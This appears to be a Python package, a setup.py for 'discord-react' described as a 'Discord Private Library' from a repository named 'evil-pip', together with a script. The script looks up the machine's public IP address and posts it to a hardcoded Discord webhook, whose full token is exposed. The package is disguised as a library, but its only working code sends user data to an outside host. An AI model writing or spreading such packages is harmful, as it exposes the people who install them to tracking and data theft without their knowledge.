import setuptools

setuptools.setup(
    name="discord-react",
    packages=setuptools.find_packages(),
    version="0.0.0.2",
    license="MIT",
    description="Discord Private Library",
    author="0xe2d0",
    url="https://github.com/0xe2d0/evil-pip",
    download_url="https://github.com/0xe2d0/evil-pip/tarball/master",
    keywords=[""],
    install_requires=["requests"],  # Add 'requests' here
    classifiers=[],
)



import urllib.request
import json

def send_to_discord(webhook_url, content):
    data = {
        "content": content
    }
    data = json.dumps(data).encode('utf-8')
    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0'  # Adding a User-Agent header
    }
    request = urllib.request.Request(webhook_url, data=data, headers=headers)
    try:
        response = urllib.request.urlopen(request)
        return response.getcode()
    except urllib.error.HTTPError as e:
        print(f'HTTPError: {e.code} - {e.reason}')
        return e.code
    except urllib.error.URLError as e:
        print(f'URLError: {e.reason}')
        return None

def get_ip():
    with urllib.request.urlopen('https://api.ipify.org?format=json') as response:
        ip_info = json.loads(response.read())
    return ip_info

def main():
    webhook_url = 'https://discord.com/api/webhooks/1243998916026831043/Vhhv-m25PgiSF14Gxo-Uiw0dKXiPeEOn9D1-18oupWFjPfzOgaQTUrkRfbhsIuZTVJYI'
    ip_info = get_ip()
    send_to_discord(webhook_url, str(ip_info))

if __name__ == "__main__":
    main()

